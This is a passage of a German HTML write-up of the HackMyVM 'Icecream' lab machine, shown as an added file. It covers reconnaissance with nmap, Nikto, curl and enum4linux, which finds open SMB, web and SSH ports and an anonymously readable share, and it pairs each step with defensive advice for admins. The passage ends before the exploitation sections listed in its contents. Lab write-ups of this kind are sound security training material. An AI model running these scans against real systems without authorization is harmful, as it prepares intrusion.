@@ -1,0 +1,1529 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Icecream - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Icecream - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chisel</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ums2net</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept: Shell als www-data</a></li>
+                <li><a href="#internal-service-discovery">Interne Service Discovery & Port Forwarding</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                Die Aufklärungsphase beginnt mit der Identifizierung aktiver Systeme im Netzwerk und dem Scannen nach offenen Ports und Diensten, um potenzielle Angriffsvektoren aufzudecken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+   ARP-Scan  
+ 
+<span class="command">192.168.2.131	08:00:27:fc:5d:3d	PCS Systemtechnik GmbH</span>
+
+
+ /etc/hosts  
+ 
+                <span class="command">192.168.2.131   icecream.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der ARP-Scan (vermutlich `arp-scan -l` oder eine ähnliche Variante) wurde ausgeführt, um aktive Hosts im lokalen Netzwerk zu entdecken. Das Ergebnis zeigt einen Host mit der IP-Adresse `192.168.2.131` und der MAC-Adresse `08:00:27:fc:5d:3d`. Der Hersteller "PCS Systemtechnik GmbH" (oft mit Oracle VirtualBox assoziiert) wird für diese MAC-Adresse identifiziert.
+                Zusätzlich wurde ein Eintrag in meiner lokalen `/etc/hosts`-Datei vorgenommen, der die IP `192.168.2.131` dem Hostnamen `icecream.hmv` zuordnet. Dies ist eine gängige Praxis bei CTF-Maschinen und auch in realen Szenarien nützlich, um die Ansprache über einen Hostnamen zu ermöglichen, falls DNS nicht verfügbar oder konfiguriert ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Die Identifizierung der IP-Adresse ist der erste erfolgreiche Schritt. Die MAC-Adresse gibt einen Hinweis auf eine virtualisierte Umgebung, was bei CTFs häufig der Fall ist. Der Hostname `icecream.hmv` wird für weitere Scans und Interaktionen mit Webdiensten verwendet, um eine realitätsnahe Simulation zu gewährleisten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Nach der IP-Identifizierung ist der nächste logische Schritt ein umfassender Portscan (TCP und UDP) auf `192.168.2.131` (oder `icecream.hmv`), um offene Ports, laufende Dienste und deren Versionen zu ermitteln. Diese Informationen bilden die Grundlage für die Auswahl weiterer Angriffsvektoren.
+                <br>
+                **Empfehlung (Admin):**
+                Netzwerksegmentierung kann die Sichtbarkeit von Systemen einschränken. Die Überwachung von ARP-Traffic kann helfen, unautorisierte Geräte im Netzwerk zu erkennen. Die Vergabe von Hostnamen sollte konsistent und nachvollziehbar sein; lokale `/etc/hosts`-Einträge auf Client-Seite sind für den Admin des Zielsystems nicht direkt relevant, zeigen aber, wie Angreifer die Zielansprache vereinfachen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::  Nmap UDP Scan :::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 13:41 CEST
+Nmap scan report for 192.168.2.131
+Host is up (0.00028s latency).
+Not shown: 993 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+<span class="command">137/udp   open   netbios-ns</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Ein Nmap UDP-Scan wurde gezielt auf die IP-Adresse `192.168.2.131` durchgeführt. UDP-Scans sind oft zeitaufwendiger und weniger zuverlässig als TCP-Scans, da viele Systeme nicht auf UDP-Pakete an geschlossene Ports antworten, was zu dem Status `open|filtered` führt.
+                Die Ausgabe zeigt, dass 993 UDP-Ports als `open|filtered` eingestuft wurden.
+                Ein eindeutig offener UDP-Port wurde jedoch gefunden:
+                - `137/udp open netbios-ns`: Der NetBIOS Name Service ist aktiv. Dieser Dienst wird traditionell für die Namensauflösung in Windows-Netzwerken verwendet und ist oft Teil der Samba-Suite auf Linux-Systemen, die Windows-Interoperabilität bereitstellt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der offene Port `137/udp` (NetBIOS-NS) ist ein starker Indikator für das Vorhandensein von SMB/CIFS-Diensten auf dem Zielsystem. Dies ist ein wichtiger Fund, da SMB-Dienste oft Angriffsvektoren für Enumeration (Benutzer, Shares) und manchmal auch für direkte Ausnutzung von Schwachstellen oder Fehlkonfigurationen bieten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Dieser Fund rechtfertigt eine genauere Untersuchung der SMB-Dienste. Parallel sollte ein detaillierter TCP-Portscan durchgeführt werden, da SMB-Dienste typischerweise auch TCP-Ports verwenden (insbesondere 139 und 445). Tools wie `enum4linux` oder `smbclient` sollten eingesetzt werden, um den SMB-Dienst weiter zu untersuchen und nach offenen Shares, Benutzerlisten und anderen relevanten Informationen zu suchen.
+                <br>
+                **Empfehlung (Admin):**
+                Wenn NetBIOS-Dienste nicht zwingend für die Funktionalität im Netzwerk benötigt werden (insbesondere in reinen Linux-Umgebungen oder modernen Windows-Netzwerken, die auf DNS für die Namensauflösung setzen), sollten sie deaktiviert werden, um die Angriffsfläche zu reduzieren. Stellen Sie sicher, dass alle SMB-Dienste sicher konfiguriert sind, mit starken Passwörtern und minimal notwendigen Berechtigungen für Shares.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn --min-rate 5000 | grep open</span></div>
+                    <pre>
+<span class="command">22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http          nginx/1.22.1</span>
+<span class="command">139/tcp  open  netbios-ssn?</span>
+<span class="command">445/tcp  open  microsoft-ds?</span>
+<span class="command">9000/tcp open  cslistener?</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Dieser Nmap-Befehl führt einen TCP SYN-Scan (`-sS`) über alle 65535 Ports (`-p-`) auf der Ziel-IP (Variable `$IP`, die `192.168.2.131` enthält) durch.
+                - `-sC`: Führt Standard-NSE-Skripte aus, um zusätzliche Informationen zu sammeln.
+                - `-sV`: Versucht, Dienstversionen zu ermitteln.
+                - `-A`: Aktiviert aggressive Scan-Optionen, einschließlich OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                - `-Pn`: Überspringt die Host-Discovery-Phase (behandelt den Host als online), was nützlich ist, wenn Hosts ICMP-Anfragen blockieren.
+                - `--min-rate 5000`: Sendet Pakete mit einer Mindestrate von 5000 Paketen pro Sekunde, um den Scan zu beschleunigen.
+                - `| grep open`: Filtert die Ausgabe, um nur Zeilen anzuzeigen, die den Status "open" enthalten, was eine schnelle Übersicht der offenen Ports ermöglicht.
+
+                Die gefundenen offenen TCP-Ports und Dienste sind:
+                - `22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)`: Ein SSH-Server läuft, Version OpenSSH 9.2p1 auf einem Debian-System.
+                - `80/tcp open http nginx/1.22.1`: Ein Nginx-Webserver Version 1.22.1 ist aktiv.
+                - `139/tcp open netbios-ssn?`: NetBIOS Session Service, ein weiterer Hinweis auf SMB-Dienste. Das Fragezeichen deutet an, dass Nmap sich bei der genauen Dienstidentifikation nicht völlig sicher ist, aber es ist typisch für SMB.
+                - `445/tcp open microsoft-ds?`: SMB direkt über TCP, ebenfalls typisch für SMB-Dienste.
+                - `9000/tcp open cslistener?`: Ein Dienst auf Port 9000, den Nmap als `cslistener?` identifiziert. Dies ist keine Standard-Servicebezeichnung und bedarf weiterer Untersuchung.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Der TCP-Scan liefert mehrere wichtige Angriffsflächen:
+                - SSH (Port 22): Ein potenzieller Zugangspunkt, falls gültige Anmeldedaten gefunden oder Brute-Force-Angriffe erfolgreich sind. Die genaue Version ist für die Schwachstellenrecherche nützlich.
+                - HTTP (Port 80): Der Nginx-Webserver ist ein primäres Ziel für Web-Enumeration und die Suche nach Webanwendungsschwachstellen.
+                - SMB (Ports 139, 445): Bestätigt die Vermutung aus dem UDP-Scan. Diese Ports sind klassische Ziele für SMB-Enumeration (Shares, Benutzer).
+                - Port 9000: Dieser Port ist besonders interessant, da der Dienst nicht eindeutig identifiziert wurde. Unbekannte oder benutzerdefinierte Dienste können oft Fehlkonfigurationen oder Schwachstellen aufweisen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                - Beginnen Sie mit der Untersuchung des Webservers auf Port 80 (manuelle Analyse, Nikto, Gobuster/Feroxbuster).
+                - Führen Sie eine detaillierte SMB-Enumeration auf Ports 139 und 445 durch (z.B. mit enum4linux, smbclient), um Shares und Benutzer zu identifizieren.
+                - Versuchen Sie, den Dienst auf Port 9000 genauer zu identifizieren (z.B. mit Netcat verbinden, spezifische Nmap-Skripte wie `-A` oder Amap, und falls es sich um einen HTTP-basierten Dienst handelt, mit einem Browser oder `curl`).
+                - Halten Sie Ausschau nach möglichen Benutzernamen oder Passwörtern, die bei der SMB-Enumeration oder Web-Enumeration gefunden werden könnten und für SSH relevant sein könnten.
+                <br>
+                **Empfehlung (Admin):**
+                - Stellen Sie sicher, dass alle exponierten Dienste (SSH, Nginx, Samba und der Dienst auf Port 9000) auf dem neuesten Stand sind und sicher konfiguriert wurden.
+                - Beschränken Sie den Zugriff auf SSH auf autorisierte Benutzer und verwenden Sie starke Passwörter oder, besser noch, Key-basierte Authentifizierung.
+                - Härten Sie den Nginx-Webserver und die darauf laufenden Anwendungen.
+                - Konfigurieren Sie Samba sicher, mit minimalen Berechtigungen für Shares und starken Passwörtern. Anonymen Zugriff vermeiden, wenn nicht unbedingt nötig.
+                - Identifizieren Sie den Dienst auf Port 9000. Wenn er nicht benötigt wird, deaktivieren Sie ihn. Wenn er benötigt wird, stellen Sie sicher, dass er sicher ist und dokumentieren Sie seinen Zweck.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn --min-rate 5000</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 13:42 CEST
+Nmap scan report for icecream.hmv (192.168.2.131)
+Host is up (0.00057s latency).
+All 65535 scanned ports on icecream.hmv (192.168.2.131) are in ignored states.
+Not shown: 65535 filtered tcp ports (no-response)
+MAC Address: <span class="command">08:00:27:FC:5D:3D (Oracle VirtualBox virtual NIC)</span>
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: <span class="command">specialized|VoIP phone|general purpose|phone</span>
+Running: <span class="command">Allen-Bradley embedded, Atcom embedded, Microsoft Windows 7|8|Phone|XP|2012, Palmmicro embedded, VMware Player</span>
+OS CPE: <span class="command">cpe:/h:allen-bradley:micrologix_1100 cpe:/h:atcom:at-320 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2012 cpe:/a:vmware:player</span>
+OS details: <span class="command">Allen Bradley MicroLogix 1100 PLC, Atcom AT-320 VoIP phone, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 Update 1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012, Palmmicro AR1688 VoIP module, VMware Player virtual NAT device</span>
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.57 ms icecream.hmv (192.168.2.131)
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 32.53 seconds</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Hier wurde der vorherige Nmap-Scan wiederholt, diesmal jedoch ohne das `| grep open`, um die vollständige Ausgabe zu sehen. Der Scan wurde am 09. Oktober 2024 um 13:42 CEST gestartet.
+                Interessanterweise liefert dieser vollständige Scan nun ein widersprüchliches Ergebnis zu dem vorherigen `grep`-gefilterten Scan: "All 65535 scanned ports on icecream.hmv (192.168.2.131) are in ignored states. Not shown: 65535 filtered tcp ports (no-response)."
+                Die MAC-Adresse wird korrekt als Oracle VirtualBox virtual NIC identifiziert.
+                Nmap gibt eine Warnung aus, dass die OS-Erkennung unzuverlässig sein könnte, da kein offener und geschlossener Port gefunden wurde, was mit der Meldung über gefilterte Ports übereinstimmt. Die daraufhin aufgelisteten Betriebssysteme und Gerätetypen sind daher sehr vage und spekulativ.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Das Ergebnis dieses Nmap-Scans ist rätselhaft, da es dem vorherigen Scan, der offene Ports zeigte, direkt widerspricht. Die Meldung "All ... ports ... are in ignored states" / "filtered tcp ports (no-response)" deutet darauf hin, dass Nmap während *dieses spezifischen Scanlaufs* keine definitiven Antworten (wie SYN/ACK für offen oder RST für geschlossen) von den Ports erhalten hat. Mögliche Ursachen könnten sein:
+                1.  Eine temporäre Netzwerkinstabilität.
+                2.  Eine Firewall oder ein Intrusion Detection/Prevention System (IDS/IPS) auf dem Zielsystem oder im Netzwerk, das auf den intensiven Scan (`-A` und `--min-rate 5000`) reagiert hat und begonnen hat, Pakete zu verwerfen.
+                3.  Die hohe Scan-Rate könnte zu viele Pakete in zu kurzer Zeit erzeugt haben, was zu Paketverlusten oder einer Überlastung des Zielsystems oder eines Netzwerkgeräts geführt hat.
+                Angesichts der Tatsache, dass der unmittelbar davor durchgeführte Scan mit identischen Paramen (bis auf das `grep`) klare offene Ports zeigte, werte ich jene Ergebnisse als die zuverlässigeren für die Port-Identifikation. Es ist ein gutes Beispiel dafür, dass Scan-Ergebnisse manchmal variieren können und kritisch hinterfragt werden müssen. Die OS-Erkennung in diesem Scan ist aufgrund der gemeldeten Port-Status nicht vertrauenswürdig.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Ich werde mich auf die Ergebnisse des ersten, gefilterten TCP-Scans verlassen, der die offenen Ports 22, 80, 139, 445 und 9000 identifiziert hat. Bei widersprüchlichen Scan-Ergebnissen ist es oft ratsam, Scans mit unterschiedlichen Parametern (z.B. langsamere Rate, andere Scan-Typen wie `-sT` für einen vollständigen TCP Connect-Scan, der zuverlässiger, aber lauter ist) zu wiederholen, um die Ergebnisse zu validieren. Für eine genauere OS-Erkennung könnte ein gezielter Scan auf einen der bestätigten offenen Ports (z.B. `nmap -O --osscan-guess icecream.hmv -p80`) hilfreich sein, sobald die Port-Erreichbarkeit stabil bestätigt ist.
+                <br>
+                **Empfehlung (Admin):**
+                Wenn eine Firewall oder ein IDS/IPS im Einsatz ist, das auf intensive Scans reagiert, ist dies prinzipiell eine sinnvolle Sicherheitsmaßnahme. Es ist jedoch wichtig, die Logs dieser Systeme zu überprüfen, um festzustellen, ob der Scan erkannt und möglicherweise blockiert wurde. Stellen Sie sicher, dass das System stabil auf legitime Anfragen antwortet und nicht durch normale Netzwerkaktivitäten oder moderate Scans überlastet wird.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">
+                Da Port 80 (HTTP) mit einem Nginx-Server offen ist, untersuchen wir diesen Dienst nun genauer auf mögliche Schwachstellen oder interessante Informationen, die uns einen ersten Zugriff ermöglichen könnten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://$IP</span></div>
+                    <pre>
+*   Trying 192.168.2.131:80...
+* <span class="password">Connected to 192.168.2.131 (192.168.2.131) port 80</span>
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.131
+&gt; User-Agent: curl/8.9.1
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="command">HTTP/1.1 403 Forbidden</span>
+&lt; Server: <span class="command">nginx/1.22.1</span>
+&lt; Date: Wed, 09 Oct 2024 11:43:43 GMT
+&lt; Content-Type: text/html
+&lt; Content-Length: 153
+&lt; Connection: keep-alive
+&lt; 
+
+* Connection #0 to host 192.168.2.131 left intact
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Der Befehl `curl -Iv http://$IP` sendet eine `HEAD`-Anfrage (`-I`) an die Wurzel (`/`) des Webservers auf der Ziel-IP. Die Option `-v` (verbose) zeigt detaillierte Informationen über die Anfrage und Antwort, einschließlich der HTTP-Header.
+                Die Antwort des Servers ist:
+                - `HTTP/1.1 403 Forbidden`: Der Zugriff auf die angeforderte Ressource (`/`) ist verboten. Dies bedeutet, dass der Webserver die Anfrage verstanden hat, aber die Ausführung verweigert.
+                - `Server: nginx/1.22.1`: Bestätigt den Nginx-Webserver und seine Version.
+                - `Date: Wed, 09 Oct 2024 11:43:43 GMT`: Zeitstempel der Antwort.
+                - `Content-Type: text/html`: Obwohl der Zugriff verboten ist, wird der Inhaltstyp als HTML angegeben (wahrscheinlich für die Standard-Fehlerseite von Nginx).
+                - `Content-Length: 153`: Die Größe der Fehlerseite.
+                - `Connection: keep-alive`: Die Verbindung bleibt für weitere Anfragen offen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Ein `403 Forbidden` auf die Hauptseite (`/`) ist ein häufiges Szenario. Es bedeutet typischerweise, dass entweder keine Standard-Indexdatei (wie `index.html` oder `index.php`) im konfigurierten Wurzelverzeichnis (DocumentRoot) vorhanden ist und gleichzeitig das automatische Auflisten von Verzeichnisinhalten (Directory Listing) deaktiviert ist, oder dass der Zugriff auf die vorhandene Index-Datei explizit durch Konfigurationsregeln verweigert wird. Dies ist oft eine beabsichtigte Konfiguration, um das direkte Browsen des Wurzelverzeichnisses zu verhindern, wenn keine spezifische Startseite angezeigt werden soll. Die Nginx-Version `1.22.1` ist relativ aktuell, aber es ist immer ratsam, nach bekannten Schwachstellen für die spezifische Version zu suchen, falls andere Angriffsvektoren nicht fruchten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Da die Hauptseite nicht zugänglich ist, sind die nächsten Schritte:
+                - Durchführung von Directory-Bruteforcing-Angriffen (z.B. mit Gobuster, Feroxbuster, Dirb) unter Verwendung gängiger Wortlisten, um versteckte Dateien, Verzeichnisse oder andere Endpunkte zu finden.
+                - Testen verschiedener HTTP-Methoden (z.B. OPTIONS, GET, POST) auf `/` und andere potenziell gefundene Pfade.
+                - Einsatz von Web-Schwachstellen-Scannern wie Nikto, um nach bekannten Fehlkonfigurationen, veralteten Komponenten oder gängigen Web-Schwachstellen zu suchen.
+                <br>
+                **Empfehlung (Admin):**
+                Die `403 Forbidden`-Antwort für das Wurzelverzeichnis ist oft eine gewünschte Sicherheitsmaßnahme. Stellen Sie sicher, dass Directory Listing global deaktiviert ist (`Options -Indexes` bei Apache, oder entsprechende Nginx-Konfiguration), wenn es nicht explizit benötigt wird. Überprüfen Sie die Nginx-Konfiguration, um sicherzustellen, dass nur beabsichtigte Inhalte zugänglich sind. Halten Sie Nginx und alle Webanwendungskomponenten stets auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.131
++ Target Hostname:    192.168.2.131
++ Target Port:        80
++ Start Time:         2024-10-09 13:43:43 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.22.1</span>
++ /: <span class="command">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: <span class="command">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="password">8102 requests: 0 error(s) and 2 item(s) reported on remote host</span>
++ End Time:           2024-10-09 13:43:56 (GMT2) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                Nikto, ein Webserver-Scanner, wurde gegen den Webserver auf `192.168.2.131:80` ausgeführt, um nach bekannten Schwachstellen, Fehlkonfigurationen und interessanten Dateien zu suchen.
+                Die wichtigsten Ergebnisse sind:
+                - Bestätigung des Servers als `nginx/1.22.1`.
+                - Fehlender `X-Frame-Options`-Header: Dieser HTTP-Header wird verwendet, um zu verhindern,   was zum Schutz vor Clickjacking-Angriffen dient.
+                - Fehlender `X-Content-Type-Options`-Header (oft mit dem Wert `nosniff`): Dieser Header verhindert, dass der Browser versucht, den `Content-Type` einer Ressource zu "erraten" (MIME-Sniffing), falls dieser vom Server nicht korrekt oder eindeutig deklariert wurde. Dies kann unter bestimmten Umständen dazu führen, dass Inhalte falsch interpretiert und z.B. als Skript ausgeführt werden.
+                - Nikto fand keine CGI-Verzeichnisse mit seinen Standardtests (die Option `-C all` würde eine umfassendere Suche erzwingen).
+                - Insgesamt wurden nur 2 Items (die beiden fehlenden Header) gemeldet, was darauf hindeutet, dass Nikto keine weiteren offensichtlichen Schwachstellen oder interessante Dateien auf der Wurzelebene der Webseite gefunden hat. Dies ist konsistent mit der `403 Forbidden`-Antwort, die wir zuvor mit `curl` erhalten haben.
+            </p>
+            <p class="evaluation">
+                **Bewertung:**
+                Nikto hat zwei gängige, aber eher risikoarme Header-Fehlkonfigurationen aufgedeckt. Diese sollten im Rahmen einer sicheren Konfiguration behoben werden, stellen aber keinen direkten Weg für einen initialen Zugriff dar. Die Tatsache, dass Nikto ansonsten keine kritischen Schwachstellen oder Dateien auf der Wurzelebene findet, legt nahe, dass die Angriffsfläche hier gering ist oder dass Schwachstellen in nicht standardmäßigen Pfaden liegen, die erst durch Directory Brute-Forcing entdeckt werden müssen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                Obwohl diese Funde nicht kritisch sind, sind sie dennoch nützliche Informationen. Da Nikto auf der Wurzelebene nicht viel findet, ist Directory-Bruteforcing mit Tools wie Gobuster oder Feroxbuster der nächste logische Schritt, um versteckte Inhalte, API-Endpunkte oder administrative Schnittstellen aufzudecken, die nicht direkt verlinkt sind.
+                <br>
+                **Empfehlung (Admin):**
+                - Fügen Sie die HTTP-Header `X-Frame-Options: DENY` (oder `SAMEORIGIN`, je nach Anforderung) und `X-Content-Type-Options: nosniff` zur Nginx-Konfiguration hinzu, um Clickjacking- und MIME-Sniffing-Risiken zu mitigieren. Dies kann global oder pro vHost erfolgen.
+                - Überprüfen Sie regelmäßig die Webserver-Konfiguration auf die Einhaltung von Security Best Practices und stellen Sie sicher, dass alle nicht benötigten Module oder Features deaktiviert sind.
+            </p>
+        </section>
+        <section id="smb-enumeration">
+            <h2>SMB Enumeration</h2>
+            <p class="comment">
+                Nachdem die Nmap-Scans offene SMB-Ports (137/udp, 139/tcp, 445/tcp) gezeigt haben, konzentrieren wir uns nun auf die Enumeration dieser Dienste, um Informationen über Shares, Benutzer und mögliche Schwachstellen zu sammeln. SMB ist oft ein fruchtbarer Boden für Informationsgewinnung.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.131</span></div>
+                    <pre>
+
+ =================================( Share Enumeration on 192.168.2.131 )=================================
+
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	<span class="command">print$          Disk      Printer Drivers</span>
+	<span class="command">icecream        Disk      tmp Folder</span>
+	<span class="command">IPC$            IPC       IPC Service (Samba 4.17.12-Debian)</span>
+	<span class="command">nobody          Disk      Home Directories</span>
+
+Reconnecting with SMB1 for workgroup listing.
+Protocol negotiation to server 192.168.2.131 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 192.168.2.131
+
+//192.168.2.131/print$	Mapping: <span class="password">DENIED</span> Listing: N/A Writing: N/A
+//192.168.2.131/icecream	Mapping: <span class="password">OK</span> Listing: <span class="password">OK</span> Writing: <span class="password">N/A</span>
+
+[E] Can't understand response:
+
+NT_STATUS_CONNECTION_REFUSED listing \*
+//192.168.2.131/IPC$	Mapping: N/A Listing: N/A Writing: N/A
+//192.168.2.131/nobody	Mapping: <span class="password">DENIED</span> Listing: N/A Writing: N/A
+
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-5-21-780586060-1811573838-1416508090 and logon username '', password ''
+
+S-1-5-21-780586060-1811573838-1416508090-501 <span class="command">ICECREAM\nobody (Local User)</span>
+S-1-5-21-780586060-1811573838-1416508090-513 <span class="command">ICECREAM\None (Domain Group)</span>
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 <span class="command">Unix User\ice (Local User)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:**
+                `enum4linux -a 192.168.2.131` wurde ausgeführt, um eine umfassende SMB-Enumeration gegen das Zielsystem durchzuführen. Die Option `-a` versucht, alle verfügbaren Informationen abzurufen.
+                - **Share Enumeration:**
+                    - Vier Shares wurden identifiziert: `print$` (üblich für Druckertreiber), `icecream` (mit dem Kommentar "tmp Folder", was sehr interessant ist), `IPC$` (Inter-Process Communication, oft für anonyme Verbindungen genutzt, um weitere Informationen abzufragen) und `nobody` (mit dem Kommentar "Home Directories", was ungewöhnlich für einen Share namens "nobody" ist).
+                    - Der `IPC$` Share gibt die Samba-Version als `Samba 4.17.12-Debian` preis.
+                - **Share Mapping/Listing (Anonymer Zugriff):**
+                    - Der Zugriff auf `print$` und `nobody` wurde verweigert (`DENIED`).
+                    - Entscheidend: Für den Share `icecream` war das Mapping und Listing erfolgreich (`Mapping: OK Listing: OK`), jedoch wurde kein Schreibzugriff (`Writing: N/A`) für den anonymen Benutzer gemeldet.
+                    - Beim Versuch, `IPC$` zu nutzen, gab es einen Verbindungsfehler (`NT_STATUS_CONNECTION_REFUSED listing \*`).
+                - **User Enumeration (via SIDs):**
+                    - Standard Built-in Gruppen wurden wie erwartet gefunden.
+                    - Durch SID-Cycling wurden zwei interessante lokale Benutzer identifiziert: `ICECREAM\nobody` (UID 501) und `Unix User\ice` (UID 1000). Der Benutzername "ice" ist besonders relevant, da er zum Hostnamen "icecream" passt und UID 1000 oft der erste reguläre Benutzer auf einem Linux-System ist.
